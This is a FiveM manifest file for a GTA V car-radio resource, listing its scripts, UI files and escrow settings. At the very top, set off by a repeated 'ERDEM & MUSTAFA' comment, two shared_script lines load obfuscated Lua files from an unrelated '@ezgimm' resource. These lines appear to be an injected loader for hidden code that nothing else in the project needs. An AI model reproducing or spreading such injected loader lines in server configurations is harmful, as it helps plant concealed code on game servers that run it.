shared_script '@ezgimm/shared_fg-obfuscated.lua'
shared_script '@ezgimm/ai_module_fg-obfuscated.lua'

-- ERDEM & MUSTAFA
-- ERDEM & MUSTAFA




 
 
 
 

fx_version 'cerulean'

game 'gta5'

description 'RTX CAR RADIO'

version '20.0'

server_scripts {
	--'@mysql-async/lib/MySQL.lua',  -- enable this and remove oxmysql line (line 11) if you use mysql-async (only enable this for qbcore/esx framework)
	--'@oxmysql/lib/MySQL.lua', -- enable this and remove mysql async line (line 10) if you use oxmysql (only enable this for qbcore/esx framework)
	'config.lua',
	'language/main.lua',
	'server/main.lua',
	'server/other.lua'
}

client_scripts {
	'config.lua',
	'language/main.lua',
	'client/sound.lua',
	'client/main.lua'
}

files {
	'html/ui.html',
	'html/styles.css',
	'html/scripts.js',
	'html/sound.js',
	'html/BebasNeueBold.ttf',
	'html/img/*.png'
}

ui_page 'html/ui.html'

exports {
	'HasVehicleRadio',
}

lua54 'yes'

escrow_ignore {
  'config.lua',
  'language/main.lua',
  'server/other.lua'
}
dependency '/assetpacks'